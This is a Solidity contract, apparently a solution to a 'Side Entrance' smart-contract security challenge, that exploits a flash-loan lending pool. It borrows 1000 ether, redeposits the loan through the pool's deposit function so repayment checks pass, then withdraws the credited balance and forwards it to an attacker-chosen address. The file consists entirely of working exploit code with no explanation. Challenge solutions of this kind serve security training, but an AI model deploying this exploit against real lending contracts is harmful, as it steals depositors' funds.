// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool{
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttack is IFlashLoanEtherReceiver{

    address private receiver;

    constructor (address _receiver) {
        receiver = _receiver;
    }

    function hack(ISideEntranceLenderPool target) external {
        target.flashLoan(1000 ether);
    }

    function execute() external payable{
        ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function getFunds(address target) external {
        ISideEntranceLenderPool(target).withdraw();
    }

    fallback() external payable{
        payable(receiver).transfer(msg.value);
    }
}